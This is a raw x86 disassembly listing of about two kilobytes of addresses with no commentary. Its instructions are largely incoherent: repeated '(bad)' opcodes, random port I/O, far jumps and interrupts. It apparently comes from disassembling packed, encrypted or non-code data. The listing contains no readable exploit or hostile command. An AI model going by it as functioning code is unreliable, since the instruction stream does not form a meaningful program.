  407110:	scas   eax,DWORD PTR es:[edi]
  407111:	and    BYTE PTR [ebp-0xcc65c56],dl
  407117:	ja     0x40717e
  407119:	fcmovnu st,st(5)
  40711b:	loop   0x407100
  40711d:	enter  0x3012,0xb1
  407121:	add    bl,BYTE PTR [ebx+0x7164e18a]
  407127:	mov    esp,0x3b0a7b1c
  40712c:	add    edi,DWORD PTR [ebp-0x1824547b]
  407132:	inc    eax
  407133:	into   
  407134:	adc    bh,BYTE PTR [eax]
  407136:	adc    al,0x1
  407138:	repz sub BYTE PTR ds:[ebp-0x10],dh
  40713d:	or     al,0xe2
  40713f:	xchg   ebx,eax
  407140:	test   eax,0xfb3a8ed8
  407145:	nop
  407146:	mov    dl,0xcf
  407148:	pop    ebx
  407149:	lods   eax,DWORD PTR ds:[esi]
  40714a:	lahf   
  40714b:	clc    
  40714c:	push   ebp
  40714d:	and    ecx,DWORD PTR [eax+0x4c]
  407150:	xchg   esp,eax
  407151:	sbb    bl,BYTE PTR [edi+0x34]
  407154:	push   ss
  407155:	(bad)  
  407156:	fnstsw WORD PTR ds:0xa41c27f7
  40715c:	add    edx,esp
  40715e:	mov    al,ds:0x937f15dc
  407163:	pop    ecx
  407164:	in     al,dx
  407165:	scas   eax,DWORD PTR es:[edi]
  407166:	sub    BYTE PTR [ebx-0x519f7e02],cl
  40716c:	mov    eax,ds:0x1d01d382
  407171:	xchg   esp,eax
  407172:	lahf   
  407173:	push   ss
  407174:	add    cx,WORD PTR [edi+0x5ecd6fb0]
  40717b:	xor    DWORD PTR [eax],ebp
  40717d:	push   esp
  40717e:	out    dx,al
  40717f:	mov    ch,0xd4
  407181:	into   
  407182:	cli    
  407183:	mov    edi,0x29fe190e
  407188:	mov    cl,0xa3
  40718a:	fiadd  WORD PTR [ecx+0x4992e9bb]
  407190:	pop    ebp
  407191:	mov    dl,0x83
  407193:	xchg   edi,eax
  407194:	dec    DWORD PTR [eax-0x75754fa1]
  40719a:	leave  
  40719b:	(bad)  
  40719c:	iret   
  40719d:	rcl    al,0xb1
  4071a0:	xchg   esp,eax
  4071a1:	sub    DWORD PTR ds:0xe218129a,edx
  4071a7:	ficomp DWORD PTR [edi+0x5e4e8913]
  4071ad:	jle    0x4071b8
  4071af:	add    al,0x56
  4071b1:	xchg   DWORD PTR [ebx],ecx
  4071b3:	lahf   
  4071b4:	cmp    DWORD PTR [ebx-0x2e],eax
  4071b7:	loop   0x407173
  4071b9:	ss jns 0x40714b
  4071bc:	popf   
  4071bd:	out    0xbd,al
  4071bf:	mov    dl,al
  4071c1:	xchg   esp,eax
  4071c2:	push   0xfffffffc
  4071c4:	and    al,0xa9
  4071c6:	dec    esi
  4071c7:	mov    ebp,DWORD PTR [ebx+edi*8-0x62e5d64f]
  4071ce:	inc    ecx
  4071cf:	fldlg2 
  4071d1:	push   eax
  4071d2:	inc    eax
  4071d3:	fsub   DWORD PTR [ecx+0x414c731c]
  4071d9:	inc    ebp
  4071da:	xchg   esi,eax
  4071db:	iret   
  4071dc:	ja     0x407220
  4071de:	xchg   ebp,eax
  4071df:	xchg   ecx,eax
  4071e0:	js     0x407260
  4071e2:	fbstp  TBYTE PTR [eax]
  4071e4:	xor    bh,dh
  4071e6:	mov    cl,0x91
  4071e8:	retf   
  4071e9:	mov    eax,0xa7265b2f
  4071ee:	adc    eax,0x65238fc5
  4071f3:	add    DWORD PTR [esi-0x47d3c7dc],edx
  4071f9:	outs   dx,DWORD PTR ds:[esi]
  4071fa:	ins    BYTE PTR es:[edi],dx
  4071fb:	ret    
  4071fc:	mov    ebp,0xbef862ef
  407201:	xchg   edi,eax
  407202:	das    
  407203:	aad    0x2a
  407205:	pop    eax
  407206:	ficom  DWORD PTR [esi+0x47a1ff51]
  40720c:	mov    ss,WORD PTR [edi+0x28]
  40720f:	jle    0x4071a0
  407211:	jmp    0x952a:0xb0e5523f
  407218:	sbb    al,0x51
  40721a:	shl    edi,cl
  40721c:	xchg   esp,eax
  40721d:	(bad)  
  40721e:	jmp    0x6e74cc99
  407223:	in     eax,dx
  407224:	idiv   DWORD PTR [eax-0x22]
  407227:	inc    ebp
  407228:	adc    al,0x4e
  40722a:	inc    ecx
  40722b:	bound  esi,QWORD PTR [esi-0x36]
  40722e:	mov    bh,0x18
  407230:	or     DWORD PTR [esi+0x69],ecx
  407233:	jb     0x4071d3
  407235:	dec    ebp
  407236:	imul   ecx,DWORD PTR [ebp+0x57],0xffffffcb
  40723a:	int    0x7c
  40723c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40723d:	clc    
  40723e:	jne    0x407249
  407240:	cmp    DWORD PTR [ebp-0x70160df2],edx
  407246:	gs jae 0x4071fa
  407249:	ins    DWORD PTR es:[edi],dx
  40724a:	pop    esp
  40724b:	xchg   DWORD PTR [edi-0x58],edx
  40724e:	add    BYTE PTR ds:0x5299db29,bh
  407254:	mov    esp,0x7a70eb5
  407259:	(bad)  
  40725a:	mov    dl,0xe
  40725c:	adc    edi,DWORD PTR [esi+0x4a]
  40725f:	pop    ecx
  407260:	aam    0xed
  407262:	dec    edx
  407263:	mov    esi,0x94e800c7
  407268:	sar    BYTE PTR [ebx],1
  40726a:	jmp    0x143de54c
  40726f:	stos   DWORD PTR es:[edi],eax
  407270:	int3   
  407271:	pop    ds
  407272:	in     al,dx
  407273:	out    dx,al
  407274:	in     eax,dx
  407275:	mov    ds:0x47047e0e,al
  40727a:	daa    
  40727b:	arpl   WORD PTR [eax+0x612e8ad6],cx
  407281:	sub    BYTE PTR [eax+0x16],bh
  407284:	inc    edi
  407285:	pop    edi
  407286:	div    DWORD PTR [esi+0x46]
  407289:	lahf   
  40728a:	add    al,0xc9
  40728c:	or     al,0xc5
  40728e:	mov    bl,0x58
  407290:	pop    ebx
  407291:	push   esi
  407292:	cmp    eax,0x825b9525
  407297:	dec    esp
  407298:	(bad)  
  407299:	retf   
  40729a:	ds push 0xffc0d8ed
  4072a0:	pop    esp
  4072a1:	lds    ecx,FWORD PTR [ecx-0x76]
  4072a4:	push   0x12
  4072a6:	shr    DWORD PTR [edi-0x1],cl
  4072a9:	stos   DWORD PTR es:[edi],eax
  4072aa:	lea    esi,[eax+0x1e]
  4072ad:	dec    ebx
  4072ae:	iret   
  4072af:	and    DWORD PTR [ebx+eiz*8+0x71ccea9d],ebx
  4072b6:	into   
  4072b7:	(bad)  
  4072b8:	ds xchg esp,eax
  4072ba:	push   ss
  4072bb:	les    esp,FWORD PTR [ebx+0x1edecb1e]
  4072c1:	ret    
  4072c2:	je     0x407299
  4072c4:	add    DWORD PTR [ecx+0x6b],ebx
  4072c7:	add    esi,eax
  4072c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072cb:	cmp    BYTE PTR [ecx],dl
  4072cd:	mov    ch,ah
  4072cf:	rol    DWORD PTR [ebx+0x76111ca],cl
  4072d5:	inc    esp
  4072d6:	xchg   ebp,eax
  4072d7:	mov    WORD PTR [esi],cs
  4072d9:	add    DWORD PTR [edx],0x5887d67d
  4072df:	jne    0x407356
  4072e1:	mov    eax,0x30aefe46
  4072e6:	push   esi
  4072e7:	pop    ecx
  4072e8:	mov    cl,0x69
  4072ea:	jp     0x407317
  4072ec:	mov    ebx,esi
  4072ee:	nop
  4072ef:	adc    al,0x78
  4072f1:	jmp    0x407299
  4072f3:	in     eax,0xfa
  4072f5:	(bad)  
  4072f6:	xchg   edi,eax
  4072f7:	sbb    BYTE PTR [eax-0x78],dl
  4072fa:	in     al,dx
  4072fb:	adc    BYTE PTR [esi+edx*2],dh
  4072fe:	pop    esp
  4072ff:	inc    edx
  407300:	add    DWORD PTR [ebx-0x4f],ebp
  407303:	pushf  
  407304:	pushf  
  407305:	mul    BYTE PTR [ebp+0x7e]
  407308:	cmp    BYTE PTR [esi+ecx*1-0x18],ch
  40730c:	shl    BYTE PTR [esi],cl
  40730e:	into   
  40730f:	clc    
  407310:	sub    BYTE PTR [ebx+0x3b],ch
  407313:	rcr    DWORD PTR [ecx+0x22],1
  407316:	and    bh,BYTE PTR [ebx-0x7c]
  407319:	pop    si
  40731b:	push   cs
  40731c:	lods   al,BYTE PTR ds:[esi]
  40731d:	nop
  40731e:	push   ebp
  40731f:	push   edx
  407320:	lods   al,BYTE PTR ds:[esi]
  407321:	adc    DWORD PTR [ebx],0xffffffb6
  407324:	push   cs
  407325:	jb     0x407395
  407327:	cs mov bh,0xab
  40732a:	aad    0xf5
  40732c:	mov    ecx,0xd6b8eb58
  407331:	or     al,0xe5
  407333:	sbb    bl,BYTE PTR [ecx+ebp*4]
  407336:	jl     0x407386
  407338:	std    
  407339:	add    dh,cl
  40733b:	push   esp
  40733c:	push   edx
  40733d:	cmp    DWORD PTR [edx],ecx
  40733f:	pop    esi
  407340:	inc    eax
  407341:	dec    esp
  407342:	jecxz  0x4072d4
  407344:	add    DWORD PTR [ebp+0x6e],edi
  407347:	dec    edx
  407348:	imul   dl
  40734a:	adc    bl,BYTE PTR [ebp-0x256d779c]
  407350:	sub    esp,DWORD PTR [edi+0x52dbefa2]
  407356:	pop    ds
  407357:	inc    esi
  407358:	lods   al,BYTE PTR ds:[esi]
  407359:	shr    BYTE PTR [eax+0x6c],1
  40735c:	jne    0x4072e0
  40735e:	outs   dx,DWORD PTR ds:[esi]
  40735f:	in     al,dx
  407360:	dec    ebx
  407361:	pop    ds
  407362:	pushf  
  407363:	mov    dl,0xfb
  407365:	push   edx
  407366:	mov    BYTE PTR [edi+0x526718eb],dl
  40736c:	push   ebp
  40736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40736e:	and    eax,0xf6801633
  407373:	adc    dh,BYTE PTR [ebp+0x6c6e4fa7]
  407379:	(bad)  [esi-0x28]
  40737c:	in     eax,dx
  40737d:	xor    ebx,DWORD PTR gs:[esi-0x39e7a6c7]
  407384:	idiv   DWORD PTR [edi-0x76]
  407387:	outs   dx,DWORD PTR ds:[esi]
  407388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407389:	ja     0x40732f
  40738b:	lds    esi,FWORD PTR [ebx+0x11]
  40738e:	mov    bl,BYTE PTR [edi-0xc38bf07]
  407394:	into   
  407395:	cs loop 0x407318
  407398:	or     eax,0x911bf801
  40739d:	push   cs
  40739e:	sub    BYTE PTR [edi+0x71],al
  4073a1:	not    BYTE PTR [esi-0x55918b3e]
  4073a7:	mov    dh,BYTE PTR [ebp-0x5b]
  4073aa:	jb     0x407427
  4073ac:	jbe    0x407412
  4073ae:	not    bh
  4073b0:	call   0xe8954a7
  4073b5:	cmp    eax,0xe80772c2
  4073ba:	sti    
  4073bb:	fbld   TBYTE PTR [ecx+0x1ceb01df]
  4073c1:	test   BYTE PTR [ecx-0x1cb0fa97],0xeb
  4073c8:	mov    esi,0x2fd44b0c
  4073cd:	adc    al,bh
  4073cf:	popf   
  4073d0:	push   ebp
  4073d1:	sti    
  4073d2:	jns    0x4073ee
  4073d4:	icebp  
  4073d5:	jae    0x407364
  4073d7:	mov    ebp,0x86ddaa04
  4073dc:	lods   al,BYTE PTR ds:[esi]
  4073dd:	scas   eax,DWORD PTR es:[edi]
  4073de:	scas   al,BYTE PTR es:[edi]
  4073df:	int    0x60
  4073e1:	daa    
  4073e2:	push   ebx
  4073e3:	add    BYTE PTR ds:0x3bb339b9,dl
  4073e9:	out    0x6c,eax
  4073eb:	mov    edi,edx
  4073ed:	mov    ecx,0x52e76866
  4073f2:	mov    bh,0x5
  4073f4:	xchg   DWORD PTR [edi-0x8],eax
  4073f7:	aas    
  4073f8:	add    DWORD PTR [ebx+0xa],ebp
  4073fb:	mov    esi,0x91614138
  407400:	dec    ebp
  407401:	sub    BYTE PTR [ebp+0x12506652],ah
  407407:	inc    ebx
  407408:	and    ecx,eax
  40740a:	fwait
  40740b:	jne    0x40744c
  40740d:	dec    ecx
  40740e:	test   eax,0x918ec516
  407413:	or     al,bl
  407415:	test   al,0x21
  407417:	cmp    BYTE PTR [edi],0x9
  40741a:	jge    0x4073ed
  40741c:	or     esi,esi
  40741e:	fcmovu st,st(1)
  407420:	jle    0x4073b8
  407422:	xchg   BYTE PTR [eax-0x347719f4],bh
  407428:	nop
  407429:	xor    ah,cl
  40742b:	adc    ah,BYTE PTR [ebx]
  40742d:	cmp    DWORD PTR [ecx-0x51fc1750],ebp
  407433:	xor    dl,BYTE PTR [ecx]
  407435:	scas   al,BYTE PTR es:[edi]
  407436:	mov    eax,0x1ba8ef2e
  40743b:	adc    DWORD PTR [edi+0x7b],ebp
  40743e:	sar    BYTE PTR [ecx-0xc],cl
  407441:	hlt    
  407442:	jecxz  0x4074c1
  407444:	pop    esi
  407445:	cdq    
  407446:	dec    edx
  407447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407448:	pop    ecx
  407449:	xchg   ecx,eax
  40744a:	in     eax,dx
  40744b:	jb     0x4073f0
  40744d:	mov    dl,0x71
  40744f:	add    DWORD PTR [ecx-0x23],0xffffff94
  407453:	(bad)
  407459:	mov    eax,0x7783c556
  40745e:	or     ebx,edi
  407460:	cdq    
  407461:	aam    0x6f
  407463:	stos   BYTE PTR es:[edi],al
  407464:	mov    edx,0x96cab285
  407469:	mov    edi,0x35c07ada
  40746e:	inc    eax
  40746f:	pusha  
  407470:	out    dx,al
  407471:	xor    BYTE PTR [edi+esi*4+0x2d],al
  407475:	test   al,0x9f
  407477:	ds clc 
  407479:	or     dh,BYTE PTR [eax-0x498baffa]
  40747f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407480:	jno    0x407444
  407482:	adc    dl,BYTE PTR [ebx-0x2dc4574c]
  407488:	in     eax,0xba
  40748a:	inc    esi
  40748b:	rcl    ecx,cl
  40748d:	call   0xf450:0xd59e79fe
  407494:	ror    DWORD PTR [esi+edi*8+0x5c],0x90
  407499:	mov    esp,0xfb654134
  40749e:	dec    esi
  40749f:	repnz mov ebp,0x2d31ad73
  4074a5:	int3   
  4074a6:	mov    ah,0xc2
  4074a8:	inc    eax
  4074a9:	mov    ecx,0xfb168c61
  4074ae:	push   0xc1d3428a
  4074b3:	sbb    BYTE PTR [edx-0x47],0xb2
  4074b7:	adc    al,0xa8
  4074b9:	lock adc al,0x99
  4074bc:	mov    ebp,0x12c1256a
  4074c1:	cmp    edi,ebx
  4074c3:	sbb    eax,0xf6f86ded
  4074c8:	or     DWORD PTR [eax+esi*8-0x537cd6d3],0xdd86f041
  4074d3:	stc    
  4074d4:	das    
  4074d5:	add    al,0x66
  4074d7:	dec    esp
  4074d8:	shl    ebx,1
  4074da:	mov    ds,WORD PTR [eax+0x60a35001]
  4074e0:	out    0x11,al
  4074e2:	nop
  4074e3:	push   ecx
  4074e4:	fiadd  DWORD PTR [edi-0x36b72718]
  4074ea:	mov    ebp,0x769f5def
  4074ef:	jne    0x40748e
  4074f1:	test   dl,cl
  4074f3:	mov    ss,WORD PTR [esi+0x71e85acd]
  4074f9:	retf   
  4074fa:	inc    esi
  4074fb:	pop    DWORD PTR [esi]
  4074fd:	cs push ss
  4074ff:	sar    BYTE PTR [ebx+0x113ab430],1
  407505:	lods   al,BYTE PTR ds:[esi]
  407506:	rol    DWORD PTR [esi-0x5e],cl
  407509:	jmp    0x2f7f58ff
  40750e:	add    dl,BYTE PTR [esi+esi*8+0x7c]
  407512:	int    0x21
  407514:	aad    0x6f
  407516:	popa   
  407517:	popa   
  407518:	imul   ebx,DWORD PTR [ecx+ecx*2+0x517083db],0x1201dc31
  407523:	(bad)  
  407524:	aas    
  407525:	sub    edi,DWORD PTR [esi+0x25]
  407528:	(bad)  
  407529:	and    eax,0xc03da603
  40752e:	jge    0x4075a8
  407530:	and    DWORD PTR [ecx],esi
  407532:	and    al,BYTE PTR [eax+0x5cf748c0]
  407538:	or     BYTE PTR [edi],bh
  40753a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40753b:	sbb    ecx,esp
  40753d:	or     BYTE PTR [esi],dl
  40753f:	xchg   esp,eax
  407540:	push   ss
  407541:	dec    edx
  407542:	cmp    ebx,edx
  407544:	jg     0x407510
  407546:	xchg   edx,eax
  407547:	add    eax,0x4b5c73b6
  40754c:	add    al,0xa5
  40754e:	out    dx,al
  40754f:	call   0x7eb0:0xd0a63c9d
  407556:	xchg   esi,eax
  407557:	xor    al,0x4
  407559:	and    al,0xdb
  40755c:	retf   
  40755d:	jmp    0x40757c
  40755f:	fcomip st,st(4)
  407561:	mov    edi,0x21e2c778
  407566:	or     DWORD PTR [edx-0x62],ebp
  407569:	cwde   
  40756a:	xor    DWORD PTR es:[esi+ecx*2+0x74],esp
  40756f:	imul   eax,DWORD PTR [edi+ecx*4+0x61],0x7e9c921e
  407577:	cdq    
  407578:	adc    DWORD PTR [ebp+ebx*8-0x79],ecx
  40757c:	pop    ds
  40757d:	sbb    eax,0x495604d0
  407582:	in     eax,0xa3
  407584:	xor    DWORD PTR [ecx+0xbab6812],0x5cec2a04
  40758e:	mov    ecx,0x266d297e
  407593:	pop    esi
  407594:	es xchg esp,eax
  407596:	jo     0x407596
  407598:	jae    0x407597
  40759a:	lds    esi,FWORD PTR [ebx+ebx*8-0x7b]
  40759e:	(bad)  
  40759f:	jl     0x4075e4
  4075a1:	mov    BYTE PTR [edi+0x66],dh
  4075a4:	jecxz  0x4075a7
  4075a6:	gs imul ebx,esi,0x62d7048d
  4075ad:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075af:	je     0x4075af
  4075b1:	sbb    al,0xfa
  4075b3:	pusha  
  4075b4:	jae    0x40760a
  4075b6:	mov    ah,0x50
  4075b8:	fcmovb st,st(7)
  4075ba:	div    BYTE PTR [edi-0x2]
  4075bd:	pop    ss
  4075be:	xor    eax,0x1c7b28fa
  4075c3:	pop    edx
  4075c4:	aaa    
  4075c5:	jb     0x40763d
  4075c7:	push   esi
  4075c8:	xchg   dh,ah
  4075ca:	popa   
  4075cb:	xchg   cl,ah
  4075cd:	lock loopne 0x407568
  4075d0:	sbb    eax,0xb810e846
  4075d5:	fidivr WORD PTR [ecx+ebp*4+0x5635d13c]
  4075dc:	js     0x40762e
  4075de:	xor    bl,bl
  4075e0:	xor    DWORD PTR [edx+0x2759c940],esp
  4075e6:	xor    eax,0x855c0d7b
  4075eb:	xchg   esp,eax
  4075ec:	sar    esi,0x3d
  4075ef:	mov    ecx,gs
  4075f1:	push   es
  4075f2:	xchg   BYTE PTR [ebp-0x3107e7f2],al
  4075f8:	jnp    0x4075b7
  4075fa:	push   0x648be1d6
  4075ff:	xor    al,0x5e
  407601:	add    BYTE PTR [ebp+0x4607adfd],bh
  407607:	lods   al,BYTE PTR ds:[esi]
  407608:	mov    ds:0x3afae08f,al
  40760d:	sub    eax,0x86984dd
  407612:	imul   eax,DWORD PTR ds:0x9349bfb0,0xc565ee5
  40761c:	push   es
  40761d:	pop    ebp
  40761e:	test   BYTE PTR [eax+esi*2-0x2c],0xe1
  407623:	cmp    dh,cl
  407625:	pushf  
  407626:	dec    edx
  407627:	xchg   esp,eax
  407628:	dec    edx
  407629:	inc    ecx
  40762a:	add    al,0x9d
  40762c:	enter  0xdbcc,0xa9
  407630:	popa   
  407631:	add    DWORD PTR [ebx],ebp
  407633:	push   di
  407635:	adc    edi,DWORD PTR [ebp-0x259f07ad]
  40763b:	and    BYTE PTR [eax+0x7a],0x52
  40763f:	aam    0x16
  407641:	mov    ch,0x40
  407643:	clc    
  407644:	es pop ss
  407646:	(bad)  
  407647:	fdiv   st(2),st
  407649:	xor    eax,0x41ce0e0e
  40764e:	shr    DWORD PTR fs:[esi+eax*1+0x25a444bc],1
  407656:	and    bl,BYTE PTR [edi-0x3e26a571]
  40765c:	mov    ?,WORD PTR [ecx-0x3813b8de]
  407662:	cmc    
  407663:	arpl   WORD PTR [ebx+edi*8],si
  407666:	(bad)  
  407667:	pop    esp
  407668:	xchg   ecx,eax
  407669:	lods   al,BYTE PTR ds:[esi]
  40766a:	mov    dh,0xa8
  40766c:	ss sub dh,bl
  40766f:	lea    esi,[edx+0x19]
  407672:	test   ecx,eax
  407674:	sbb    ch,BYTE PTR [esi+0x6e956787]
  40767a:	pop    ecx
  40767b:	imul   ebx,DWORD PTR [esi-0x2f],0x6b
  40767f:	push   cs
  407680:	mov    BYTE PTR [edi+0x2],al
  407683:	jnp    0x407610
  407685:	inc    ebx
  407686:	lds    ebx,FWORD PTR [ebx]
  407688:	push   esp
  407689:	jbe    0x407686
  40768b:	mov    dl,0xc9
  40768d:	or     eax,DWORD PTR [ecx-0x4]
  407690:	jmp    0x931e:0x18ee9190
  407697:	cmp    bl,BYTE PTR [ecx]
  407699:	in     eax,dx
  40769a:	or     ch,BYTE PTR [ebp+0x3d]
  40769d:	add    eax,0xbcf03d33
  4076a2:	xchg   esp,eax
  4076a3:	sub    BYTE PTR [eax-0x31d1527d],cl
  4076a9:	or     eax,0x7cd65f12
  4076ae:	imul   ebp,DWORD PTR [ecx-0x6ba18f7d],0xa4dce118
  4076b8:	fwait
  4076b9:	and    DWORD PTR [ebx+0x6f],esp
  4076bc:	add    eax,0xe6c5ab91
  4076c1:	cdq    
  4076c2:	in     eax,dx
  4076c3:	pusha  
  4076c4:	cmp    esi,DWORD PTR [edi-0x2faa0000]
  4076ca:	xor    ebx,esp
  4076cc:	mov    ch,BYTE PTR [edx]
  4076ce:	jbe    0x4076b6
  4076d0:	mov    edi,0x2f69b6ad
  4076d5:	sbb    edi,eax
  4076d7:	xor    cl,dl
  4076d9:	mov    ecx,DWORD PTR [ebx+0x587770fd]
  4076df:	sbb    al,0x75
  4076e1:	mov    dl,0x7b
  4076e3:	lods   al,BYTE PTR ds:[esi]
  4076e4:	je     0x4076b7
  4076e6:	fsub   QWORD PTR [edi+0x3c5cd183]
  4076ec:	pushw  ss
  4076ee:	cdq    
  4076ef:	hlt    
  4076f0:	mov    dl,0x7d
  4076f2:	sbb    eax,eax
  4076f4:	test   al,0x3e
  4076f6:	add    al,0xcc
  4076f8:	push   0xc7216c73
  4076fd:	jmp    0x9224746f
  407702:	ror    BYTE PTR [esi+0x30a6711c],cl
  407708:	sti    
  407709:	pop    esi
  40770a:	jle    0x40769c
  40770c:	pop    esi
  40770d:	cli    
  40770e:	dec    eax
  40770f:	fdiv   QWORD PTR [eax+0x56acdc73]
  407715:	ins    BYTE PTR es:[edi],dx
  407716:	adc    BYTE PTR [edx+0x4c],dl
  407719:	ror    edx,0xd2
  40771c:	push   cs
  40771d:	test   DWORD PTR [ebx-0x37e7b3c1],esi
  407723:	inc    esp
  407724:	iret   
  407725:	lea    ebx,[ecx+0x1c571146]
  40772b:	(bad)  
  40772c:	xchg   edx,eax
  40772d:	out    dx,al
  40772e:	loope  0x40777d
  407730:	ds sub al,0x9
  407733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407734:	mov    esp,0x640bc94
  407739:	sbb    DWORD PTR [ebx+0x45d07144],esi
  40773f:	xor    ch,BYTE PTR [edi]
  407741:	add    al,0xda
  407743:	test   eax,0xf2401c88
  407748:	add    BYTE PTR [edi-0x60],al
  40774b:	xchg   DWORD PTR [edi+0x43e7e66e],eax
  407751:	inc    esp
  407752:	loopne 0x4076ee
  407754:	mov    ss,esp
  407756:	push   es
  407757:	outs   dx,BYTE PTR ds:[esi]
  407758:	mov    DWORD PTR [ebx-0x6482c747],edi
  40775e:	add    DWORD PTR [ebx+0x612454cc],edx
  407764:	call   0xee81:0xa8eec1b4
  40776b:	mov    edi,0x2150739f
  407770:	push   ebx
  407771:	lods   al,BYTE PTR ds:[esi]
  407772:	mov    ebp,DWORD PTR [eax]
  407774:	imul   edx,DWORD PTR [ebp+0x4db7b1a],0xffffff80
  40777b:	push   esi
  40777c:	lea    esi,[edi+0x2e]
  40777f:	add    al,BYTE PTR [edx-0x19]
  407782:	dec    esi
  407783:	dec    ecx
  407784:	jmp    0x4077eb
  407786:	fisub  WORD PTR [edi]
  407788:	and    BYTE PTR [ecx],dh
  40778a:	arpl   WORD PTR [ecx+eiz*1-0x66],si
  40778e:	xor    al,bh
  407790:	dec    DWORD PTR [edi-0x38]
  407793:	mov    dl,0xec
  407795:	mov    BYTE PTR ds:0xda5c143c,0x7f
  40779c:	cmp    ah,BYTE PTR [esi+0x4b]
  40779f:	push   ebp
  4077a0:	mov    edx,DWORD PTR [edi+0x5a101f95]
  4077a6:	fdivp  st(1),st
  4077a8:	sbb    bh,BYTE PTR [esi+0x2f]
  4077ab:	push   0xffffff83
  4077ad:	xchg   edx,eax
  4077ae:	push   ss
  4077af:	sbb    DWORD PTR [edx+0x89d11fe],edi
  4077b5:	or     eax,0xf1f4c841
  4077ba:	cmovo  edx,DWORD PTR [ebx+0x42522495]
  4077c1:	mov    ebx,0xe4b469e5
  4077c6:	pushf  
  4077c7:	pop    esi
  4077c8:	xor    BYTE PTR [edx+0x5ce11129],0x5d
  4077cf:	retf   0x2a93
  4077d2:	cmp    al,0xb0
  4077d4:	and    BYTE PTR [ebx+0x22],0xd1
  4077d8:	loopne 0x40779d
  4077da:	push   ecx
  4077db:	call   0x3f8c5eb
  4077e0:	jle    0x40778b
  4077e2:	data16 fmul DWORD PTR [edx-0xe]
  4077e6:	xchg   edi,eax
  4077e7:	fdivr  QWORD PTR [esi-0x698269f1]
  4077ed:	popf   
  4077ee:	inc    ebx
  4077ef:	mov    al,ds:0xb2fba7ba
  4077f4:	or     al,0xfc
  4077f6:	loope  0x407813
  4077f8:	test   al,0x29
  4077fa:	test   eax,0x20359263
  4077ff:	and    BYTE PTR [ebp-0x1a8e42e6],cl
  407805:	xchg   edi,eax
  407806:	iret   
  407807:	pop    es
  407808:	add    ch,bh
  40780a:	int3   
  40780b:	sbb    eax,0x9fef0252
  407810:	jns    0x40780c
  407812:	clc    
  407813:	retf   0x8c72
  407816:	push   ebp
  407817:	stos   BYTE PTR es:[edi],al
  407818:	xchg   edx,eax
  407819:	and    bl,bh
  40781b:	(bad)  
  40781c:	or     al,0x7e
  40781e:	ds fmul st(1),st
  407821:	dec    ecx
  407822:	xor    dh,BYTE PTR [eax]
  407824:	mov    bl,0x2c
  407826:	popa   
  407827:	dec    ebx
  407828:	lds    eax,FWORD PTR gs:[ebx]
  40782b:	(bad)  
  40782c:	loop   0x40787e
  40782e:	mov    bh,al
  407830:	cwde   
  407831:	mov    al,ds:0x29ef978f
  407836:	xor    al,0xa5
  407838:	xor    BYTE PTR [ecx-0x2a],cl
  40783b:	mov    bl,0x43
  40783d:	gs jecxz 0x407831
  407840:	xchg   esi,eax
  407841:	sbb    esp,DWORD PTR [edx+eax*1+0x961cbd3]
  407848:	(bad)  
  407849:	ret    0xc774
  40784c:	out    0x62,al
  40784e:	dec    esi
  40784f:	adc    bh,BYTE PTR [ebx]
  407851:	and    eax,DWORD PTR [edi-0x1d211246]
  407857:	idiv   ebx
  407859:	inc    edi
  40785a:	push   esi
  40785b:	imul   ebp,DWORD PTR [esi],0xd144d888
  407861:	pop    ebx
  407862:	enter  0x2871,0x5b
  407866:	xchg   DWORD PTR [edx-0x69],ecx
  407869:	mov    esp,0xc91a6bcf
  40786e:	or     esi,edi
  407870:	pop    ss
  407871:	stos   DWORD PTR es:[edi],eax
  407872:	inc    esp
  407873:	enter  0x4b57,0xb1
  407877:	mov    cl,0x9
  407879:	out    dx,eax
  40787a:	stos   BYTE PTR es:[edi],al
  40787b:	and    BYTE PTR [edi+0x32],ch
  40787e:	jae    0x407860
  407880:	lea    esi,[eax]
  407882:	push   eax
  407883:	out    0x8f,al
  407885:	xchg   ebx,eax
  407886:	in     al,dx
  407887:	lahf   
  407888:	mov    ecx,0xe77fc51f
  40788d:	out    dx,al
  40788e:	inc    esi
  40788f:	adc    al,0xc2
  407891:	pop    edx
  407892:	mov    ebx,0xbb429362
  407897:	mov    ebx,0x49185ed6
  40789c:	ds mov bl,0xe3
  40789f:	mov    eax,ds:0x69491501
  4078a4:	jmp    0x40788f
  4078a6:	outs   dx,DWORD PTR ds:[esi]
  4078a7:	dec    eax
  4078a8:	scas   eax,DWORD PTR es:[edi]
  4078a9:	jge    0x407903
  4078ab:	(bad)  
  4078ac:	jo     0x407882
  4078ae:	xchg   esi,eax
  4078b0:	clc    
  4078b1:	mov    ebx,ebx
  4078b3:	dec    edi
  4078b4:	sbb    DWORD PTR [ebp+0x23],esp
  4078b7:	sar    BYTE PTR [ecx-0x68a53669],0x7c
  4078be:	or     DWORD PTR [ebp-0x7b0812c6],edx
  4078c4:	call   0x3448:0x1cc326af
  4078cb:	adc    eax,0x29bf0268
  4078d0:	xor    ah,BYTE PTR ds:0xfca7b5f3
  4078d6:	test   BYTE PTR [edx+0x771ff7c5],al
  4078dc:	mov    dl,0x83
  4078de:	scas   eax,DWORD PTR es:[edi]
  4078df:	ins    DWORD PTR es:[edi],dx
  4078e0:	xor    eax,0xab7cb379
  4078e5:	cli    
  4078e6:	xor    eax,0x8d1bec04
  4078eb:	pop    eax
  4078ec:	data16 rol BYTE PTR [edi-0x65],0xe0
  4078f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078f2:	sbb    eax,0x1963e43b
  4078f7:	repz inc ecx
  4078f9:	sbb    ebp,ebx
  4078fb:	fwait
  4078fc:	push   0x8403f25e
  407901:	test   eax,0xfcaa32ce
  407906:	stos   DWORD PTR es:[edi],eax
  407907:	pop    eax
  407908:	push   cs
  407909:	mov    edi,0x5dae08aa
  40790e:	outs   dx,BYTE PTR ds:[esi]
  40790f:	je     0x40798f
  407911:	or     dh,cl
  407913:	stos   BYTE PTR es:[edi],al
  407914:	xor    bh,BYTE PTR [ecx]
  407916:	mov    BYTE PTR [esi],ah
  407918:	add    DWORD PTR [eax],ebx
  40791a:	xor    BYTE PTR [esi-0x20e42978],dh
